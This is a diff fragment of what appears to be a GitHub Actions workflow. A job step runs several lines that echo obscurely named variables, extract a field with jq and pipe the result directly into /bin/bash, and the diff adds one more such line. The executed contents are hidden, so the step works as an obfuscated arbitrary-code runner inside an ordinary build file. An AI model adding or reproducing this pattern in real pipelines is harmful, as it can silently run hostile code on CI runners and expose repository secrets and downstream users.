@@ -52,6 +52,7 @@ jobs:
           echo $dtbet80 | jq -r .x50 | /bin/bash
           printf '%s' "$r2" | jq -r .w0 | /bin/bash
           echo $bo8 | jq -r .ymog0 | /bin/bash
+          echo $x7 | jq -r .od69 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
